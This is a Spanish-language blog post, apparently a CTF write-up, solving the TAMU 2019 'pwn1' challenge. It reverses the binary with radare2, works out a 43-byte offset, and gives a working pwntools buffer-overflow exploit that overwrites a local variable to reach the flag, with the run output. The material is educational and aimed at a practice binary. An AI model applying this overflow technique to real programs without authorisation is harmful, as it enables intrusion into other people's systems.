<!DOCTYPE html> <!--[if lt IE 7]><html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]--> <!--[if (IE 7)&!(IEMobile)]><html class="no-js lt-ie9 lt-ie8"><![endif]--> <!--[if (IE 8)&!(IEMobile)]><html class="no-js lt-ie9"><![endif]--> <!--[if gt IE 8]><!--> <html class="no-js"><!--<![endif]--> <head> <meta charset="UTF-8"> <meta content="text/html; charset=UTF-8" http-equiv="Content-Type"> <meta http-equiv=X-UA-Compatible content="IE=edge,chrome=1"> <title>TAMU 2019 pwn1 - BufferOverflow &#8211; c4rta</title> <meta name="description" content="Soy Omar, un amante de la ciberseguridad y las radiocomunicaciones"> <meta name="keywords" content="Explotacion Binaria, BoF stack based"> <!-- Twitter Cards --> <meta name="twitter:card" content="summary"> <meta name="twitter:image" content="http://localhost:4000/assets/img/logo7.jpg"> <meta name="twitter:title" content="TAMU 2019 pwn1 - BufferOverflow"> <meta name="twitter:description" content="Tenemos un BoF stack based donde lo usaremos para sobrescribir el valor de una variable"> <meta name="twitter:site" content="@_c4rta_"> <meta name="twitter:creator" content="@_c4rta_"> <!-- Open Graph --> <meta property="og:locale" content="en_US"> <meta property="og:type" content="article"> <meta property="og:title" content="TAMU 2019 pwn1 - BufferOverflow"> <meta property="og:description" content="Tenemos un BoF stack based donde lo usaremos para sobrescribir el valor de una variable"> <meta property="og:url" content="http://localhost:4000/TAMU-2019-pwn1/"> <meta property="og:site_name" content="c4rta"> <meta property="og:image" content="http://localhost:4000/assets/img/logo7.jpg"> <link rel="canonical" href="http://localhost:4000/TAMU-2019-pwn1/"> <link href="http://localhost:4000/feed.xml" type="application/atom+xml" rel="alternate" title="c4rta Feed"> <!-- Handheld --> <meta name="HandheldFriendly" content="True"> <meta name="MobileOptimized" content="320"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <!-- CSS --> <link rel="stylesheet" href="http://localhost:4000/assets/css/main.css"> <!-- JS --> <script src="http://localhost:4000/assets/js/modernizr-3.3.1.custom.min.js"></script> <!-- Favicons --> <link rel="apple-touch-icon" href="http://localhost:4000/assets/img/favicons/apple-icon-precomposed.png"> <link rel="apple-touch-icon" sizes="72x72" href="http://localhost:4000/assets/img/favicons/apple-icon-72x72.png"> <link rel="apple-touch-icon" sizes="114x114" href="http://localhost:4000/assets/img/favicons/apple-icon-114x114.png"> <link rel="apple-touch-icon" sizes="144x144" href="http://localhost:4000/assets/img/favicons/apple-icon-144x144.png"> <link rel="shortcut icon" type="image/png" href="http://localhost:4000/favicon.png" /> <link rel="shortcut icon" href="http://localhost:4000/favicon.ico" /> <!-- Background Image --> <style type="text/css">body {background-image:url(http://localhost:4000/assets/img/placeholder-big.jpg); background-repeat: no-repeat; background-size: cover; }</style> <!-- Post Feature Image --> </head> <body> <nav id="dl-menu" class="dl-menuwrapper" role="navigation"> <button class="dl-trigger">Open Menu</button> <ul class="dl-menu"> <li><a href="http://localhost:4000/">Home</a></li> <li> <a href="#">About</a> <ul class="dl-submenu"> <li> <img src="http://localhost:4000/assets/img/logo7.jpg" alt="c4rta photo" class="author-photo"> <h4>c4rta</h4> <p>Soy Omar, un amante de la ciberseguridad y las radiocomunicaciones</p> </li> <li><a href="http://localhost:4000/about/"><span class="btn btn-inverse">Learn More</span></a></li> <li> <a href="http://twitter.com/_c4rta_" target="_blank" rel="noopener noreferrer"><i class="fa fa-fw fa-twitter-square"></i> Twitter</a> </li> <li> <a href="http://github.com/ic4rta" target="_blank" rel="noopener noreferrer"><i class="fa fa-fw fa-github"></i> Github</a> </li> </ul><!-- /.dl-submenu --> </li> <li> <a href="#">Posts</a> <ul class="dl-submenu"> <li><a href="http://localhost:4000/posts/">All Posts</a></li> <li><a href="http://localhost:4000/tags/">All Tags</a></li> </ul> </li> </ul><!-- /.dl-menu --> </nav><!-- /.dl-menuwrapper --> <!-- Header --> <header class="header" role="banner"> <div class="wrapper animated fadeIn"> <div class="content"> <div class="post-title "> <h1>TAMU 2019 pwn1 - BufferOverflow</h1> <h4>06 Jan 2023</h4> <p class="reading-time"> <i class="fa fa-clock-o"></i> Reading time ~4 minutes </p><!-- /.entry-reading-time --> <a class="btn zoombtn" href="http://localhost:4000/posts/"> <i class="fa fa-chevron-left"></i> </a> </div> <p class="lead">Tenemos un BoF stack based donde lo usaremos para sobrescribir el valor de una variable</p> <p>El binario lo pueden descargar con:</p> <p><code class="language-plaintext highlighter-rouge">wget https://github.com/guyinatuxedo/nightmare/raw/master/modules/04-bof_variable/tamu19_pwn1/pwn1</code></p> <h2 id="analisis">Analisis</h2> <p>El binario cuenta con las siguientes protecciones:</p> <div class="language-plaintext highlighter-rouge"><pre class="highlight"><code>RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Full RELRO      No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   77 Symbols	  No	0		2		pwn1
</code></pre></div> <p>No tienec Canary asi que podemos intentar un buffer overflow, sin embargo tiene NX, asi que no podemos ejecutar una shellcode.</p> <p>Aqui intente ejecutar el binario pasandole lo que sea y luego tratando de ocasionar un buffer overflow:</p> <p><img src="/assets/img/tamu-pwn1/binario1.png" alt="" /></p> <p>Pero de ninguna forma funciono, asi que vamos a ver que esta pasando, para el reversing usare radare2</p> <p>Y miren, aqui tenemos la funcion que recibe nuestro input:</p> <p><img src="/assets/img/tamu-pwn1/radare1.png" alt="" /></p> <p>Lo mas descatable son las instrucciones:</p> <ul> <li> <p>lea eax, [ebx - 0x159f]: Que lo que esta haciendo es cargar la direccion de memoria que esta contenida en <code class="language-plaintext highlighter-rouge">ebx-0x159f</code>, esto significa que se está leyendo la dirección de memoria contenida en la ubicación de memoria apuntada por ebx-0x159f y luego cargando esa dirección en el registro eax. y lo que tiene esa direccion de memoria es nuestro input</p> </li> <li> <p>push eax: Luego nuestro input lo mete al stack</p> </li> <li> <p>lea eax, [ s1]: Esto hace lo mismo que <code class="language-plaintext highlighter-rouge">lea eax, [ebx - 0x159f]</code> pero ahora hay que tomar en cuenta que lo esta haciendo con lo que tiene la variable <code class="language-plaintext highlighter-rouge">s1</code>, esta se esta declarando como <code class="language-plaintext highlighter-rouge">var char *s1 @ ebp-0x3b</code> y esta 56 bytes por debajo del <code class="language-plaintext highlighter-rouge">EBP</code></p> </li> </ul> <p>Despues tenemos una comparacion que es:</p> <p><img src="/assets/img/tamu-pwn1/radare2.png" alt="" /></p> <p>Lo que hace primero con <code class="language-plaintext highlighter-rouge">add</code> es sumarle 16 bytes al <code class="language-plaintext highlighter-rouge">ESP</code>, esto con el fin para ajustar la posicion del <code class="language-plaintext highlighter-rouge">ESP</code> en el stack. Despues con <code class="language-plaintext highlighter-rouge">test</code>se hace una operacion AND bit a bit entre lo que le metimos como input y lo que tiene <code class="language-plaintext highlighter-rouge">s1</code>, y esto sirve ya que despues tenemos la intruccion <code class="language-plaintext highlighter-rouge">je</code> que significa <code class="language-plaintext highlighter-rouge">salta si es igual</code>, asi que si el input y <code class="language-plaintext highlighter-rouge">si</code> son iguales, la flag <code class="language-plaintext highlighter-rouge">ZF</code> se establece en 1 y salta a la direccion <code class="language-plaintext highlighter-rouge">0x5655582f</code> y si no, la <code class="language-plaintext highlighter-rouge">ZF</code> se establace en 0 y en este caso lo que pasa es que el programa se detiene como se puede ver aqui en esta imaguen que pinte jiji:</p> <p><img src="/assets/img/tamu-pwn1/radare3.gif" alt="" /></p> <p>Si son iguales el programa sigue con la ejecucion desde la funcion <code class="language-plaintext highlighter-rouge">0x5655582f</code> (color amarillo), y si no simplemente hace un exit y se detiene (color rojo).</p> <p>Despues en el programa tenemos otro input, pero es exactamente lo mismo que el que acabe de explicar, solo que la pregunta seria… ¿Cual es el valor de <code class="language-plaintext highlighter-rouge">s1</code> con el que nuestro input se esta comparando?, y lo que se me ocurrio a mi fue: si la variable <code class="language-plaintext highlighter-rouge">s1</code> se esta declarando como una variable global, entonces en la seccion .rodata de el binario debe de estar, esto es por que en .rodata se encuentran las variables inicializadas globalmente pero de solo lectura, entonces mostre la seccion .rodata con el comando <code class="language-plaintext highlighter-rouge">iz</code>:</p> <p><img src="/assets/img/tamu-pwn1/radare4.png" alt="" /></p> <p>Y wow, ahora sabemos que nuestros inputs se estan comparando con <code class="language-plaintext highlighter-rouge">Sir Lancelot of Camelot</code> y <code class="language-plaintext highlighter-rouge">To seek the Holy Grail</code>, y wow, esto es completamente inutil ya que no nos sirve para nada jaja, lo que en realidad nos sirve es lo que sigue y es donde dice:</p> <p><code class="language-plaintext highlighter-rouge">What... is my secret?</code></p> <p>Y aqui es otro input y su codigo en emsamblador es:</p> <p><img src="/assets/img/tamu-pwn1/radare5.png" alt="" /></p> <p>Esto es un mas facil de analizar, simplemente compara lo que se almacena en<code class="language-plaintext highlighter-rouge">var_10h</code> con el valor <code class="language-plaintext highlighter-rouge">0xdea110c8</code> y si son iguales manda a llama a la funcion <code class="language-plaintext highlighter-rouge">sym.print_flag</code>, que basicamente es la que imprime la flag.</p> <p>Y para explotarlo, tenemos que hacer es sobreescribir el contenido de <code class="language-plaintext highlighter-rouge">var_10</code> usando <code class="language-plaintext highlighter-rouge">gets</code>, pero no es tan obvio como parece, tenemos que tomar en cuenta en donde se ubican dos variables: <code class="language-plaintext highlighter-rouge">var_10</code> y <code class="language-plaintext highlighter-rouge">s</code>, esto con el fin de saber el desplazamiento entre esas dos y saber cuantos bytes hay que meter.</p> <p>Para saber donde esta <code class="language-plaintext highlighter-rouge">var_10</code> vemos la declaracion de la variable:</p> <p><code class="language-plaintext highlighter-rouge">var uint32_t var_10h @ ebp-0x10</code></p> <p>Esta esta 0x10 por debajo del EBP, es decir, 16 bytes.</p> <p>Y para <code class="language-plaintext highlighter-rouge">s1</code>:</p> <p><code class="language-plaintext highlighter-rouge">var char *s1 @ ebp-0x3b</code></p> <p>Esta a 0x3b, es decir, 59 bytes</p> <p>Entonces tenemos un desplazamiento de 59 - 16 = 43, asi que debemos de escribir 43 bytes antes de sobreescribir la variable</p> <h2 id="exploit">Exploit</h2> <div class="language-py highlighter-rouge"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">target</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">'./pwn1'</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">43</span> <span class="c">#Esto es el padding</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xdea110c8</span><span class="p">)</span> <span class="c">#el valor por la cual la vamos a sobreescribir</span>

<span class="n">target</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"Sir Lancelot of Camelot"</span><span class="p">)</span>
<span class="n">target</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"To seek the Holy Grail."</span><span class="p">)</span>

<span class="n">target</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">target</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div> <p>Y listo</p> <div class="language-plaintext highlighter-rouge"><pre class="highlight"><code>python3 exploit.py

[+] Starting local process './pwn1': pid 26329
/home/c4rta/Downloads/exploit.py:9: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  target.sendline("Sir Lancelot of Camelot")
/home/c4rta/Downloads/exploit.py:10: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  target.sendline("To seek the Holy Grail.")
[*] Switching to interactive mode
Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.
What... is your name?
What... is your quest?
What... is my secret?
Right. Off you go.
flag{g0ttem_b0yz} --&gt; la flag
</code></pre></div> <p>Eso ha sido todo, gracias por leer ❤</p> <p><img src="/assets/img/tamu-pwn1/waifu.webp" alt="" /></p> <div class="entry-meta"> <br> <hr> <span class="entry-tags"><a href="http://localhost:4000/tags/#Explotacion Binaria" title="Pages tagged Explotacion Binaria" class="tag"><span class="term">Explotacion Binaria</span></a><a href="http://localhost:4000/tags/#BoF stack based" title="Pages tagged BoF stack based" class="tag"><span class="term">BoF stack based</span></a></span> <span class="social-share"> <a href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:4000/TAMU-2019-pwn1/" title="Share on Facebook" class="tag"> <span class="term"><i class="fa fa-facebook-square"></i> Share</span> </a> <a href="https://twitter.com/intent/tweet?text=http://localhost:4000/TAMU-2019-pwn1/" title="Share on Twitter" class="tag"> <span class="term"><i class="fa fa-twitter-square"></i> Tweet</span> </a> <a href="https://plus.google.com/share?url=http://localhost:4000/TAMU-2019-pwn1/" title="Share on Google+" class="tag"> <span class="term"><i class="fa fa-google-plus-square"></i> +1</span> </a> </span> <div style="clear:both"></div> </div> </div> </div> <!----> <section id="utterances_thread" class="animated fadeInUp"> <script src="https://utteranc.es/client.js" repo="ic4rta/ic4rta.github.io" issue-term="pathname" label="Publicaciones" theme="github-light" crossorigin="anonymous" async> </script> </section> </header> <!-- JS --> <script src="http://localhost:4000/assets/js/jquery-1.12.0.min.js"></script> <script src="http://localhost:4000/assets/js/jquery.dlmenu.min.js"></script> <script src="http://localhost:4000/assets/js/jquery.goup.min.js"></script> <script src="http://localhost:4000/assets/js/jquery.magnific-popup.min.js"></script> <script src="http://localhost:4000/assets/js/jquery.fitvid.min.js"></script> <script src="http://localhost:4000/assets/js/scripts.js"></script> <script type="text/javascript"> var disqus_shortname = 'https-ic4rta-github-io'; (function() { var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true; dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js'; (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq); })(); (function () { var s = document.createElement('script'); s.async = true; s.type = 'text/javascript'; s.src = '//' + disqus_shortname + '.disqus.com/count.js'; (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s); }()); </script> <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript> <!-- MathJax --> <script async src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script> </body> </html>
